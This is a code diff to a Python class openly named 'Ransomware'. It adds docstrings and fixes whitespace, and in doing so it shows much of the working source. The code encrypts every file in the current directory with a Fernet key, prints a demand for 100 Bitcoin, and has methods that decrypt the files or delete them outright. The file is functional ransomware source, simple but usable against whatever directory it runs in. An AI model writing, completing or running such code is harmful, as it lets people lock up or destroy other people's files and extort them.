@@ -3,13 +3,17 @@
 from cryptography.fernet import Fernet
 import os
 
+
 class Ransomware:
     def __init__(self):
         self.key = Fernet.generate_key()
         self.files = [file for file in os.listdir() if file !=
-                      "main.py" and os.path.isfile(file)] 
+                      "main.py" and os.path.isfile(file)]
 
     def encrypt_files(self):
+        """
+        encrypts all files in the current directory
+        """
         for file in self.files:
             with open(file, "rb") as f:
                 data = f.read()
@@ -19,6 +23,9 @@ class Ransomware:
         print("All of the files have been encrypted! Send me 100 Bitcoin to decrypt them!\n\"paste bitcoin address here\"\n")
 
     def decrypt_files(self):
+        """
+        decrypts all files in the current directory
+        """
         for file in self.files:
             with open(file, "rb") as f:
                 data = f.read()
@@ -28,6 +35,9 @@ class Ransomware:
         print("all your files have been decrypted!\ngoodbye!")
 
     def delete_files(self):
+        """
+        deletes all files in the current directory
+        """
         [os.remove(file) for file in self.files]
         print("all your files have been deleted!\ngoodbye!")
 
